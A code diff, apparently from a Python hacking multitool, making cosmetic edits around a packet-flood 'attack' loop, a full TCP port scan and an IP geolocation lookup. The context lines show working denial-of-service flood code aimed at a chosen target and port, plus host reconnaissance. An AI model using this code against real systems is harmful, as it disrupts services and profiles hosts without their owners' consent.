@@ -461,10 +461,10 @@ try:
                     for i in range(sys.maxsize):
                         try:
                             sock.send(random.randbytes(10240))
-                            print(prefix("INFO") + "Attacking target: " + color() + target + accent_color() + ":" + color() + str(port) + text_color() + "..." + accent_color() + " - " + text_color() + "Attack: " + color() + str(i + 1) + accent_color(), end='\r')
+                            print(prefix("INFO") + "Attacking target: " + color() + target + accent_color() + ":" + color() + str(port) + text_color() + "..." + accent_color() + " - " + text_color() + "Attack: " + color() + str(i + 1) + accent_color(), end="\r")
                         except socket.error:
                             print()
-                            print(prefix("WARN") + "Request " + color() + str(i) + text_color() + " failed.", end='\r')
+                            print(prefix("WARN") + "Request " + color() + str(i) + text_color() + " failed.", end="\r")
                     print("\n")
                 except KeyboardInterrupt:
                     print("\n" + prefix("INFO") + "Canceling Action...")
@@ -488,16 +488,12 @@ try:
                 update_status("Scanning on " + target)
 
                 try:
-                    print(prefix("INFO") + "Preparing scan.", end='\r')
-                    time.sleep(0.1)
-                    print(prefix("INFO") + "Preparing scan..", end='\r')
-                    time.sleep(0.1)
-                    print(prefix("INFO") + "Preparing scan...", end='\r')
+                    print(prefix("INFO") + "Preparing scan...")
                     for port in range(1, 65535):
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         socket.setdefaulttimeout(0.05)
                         result = sock.connect_ex((target, port))
-                        print(prefix("INFO") + "Scanning Port... " + color() + str(port), end='\r')
+                        print(prefix("INFO") + "Scanning Port... " + color() + str(port), end="\r")
                         if result == 0:
                             print(prefix("INFO") + "Port " + color() + str(port) + text_color() + " is open!" + " "*50)
                         sock.close()
@@ -566,7 +562,7 @@ try:
                     print(prefix("INFO") + "City: " + data["city"])
                     print(prefix("INFO") + "Latitude: " + str(data["latitude"]))
                     print(prefix("INFO") + "Longitude: " + str(data["longitude"]))
-                    print(prefix("INFO") + "Google Maps: " + f"https://www.google.com/maps/@{data['latitude']},{data['longitude']},8z")
+                    print(prefix("INFO") + "Google Maps: " + f"https://www.google.com/maps/@{data['latitude']},{data['longitude']},10z")
                     print(prefix("INFO") + "EU country: " + str(data["is_eu"]))
                     print(prefix("INFO") + "Postal code: " + data["postal"])
                     print(prefix("INFO") + "System number (ASN): " + str(data["connection"]["asn"]))
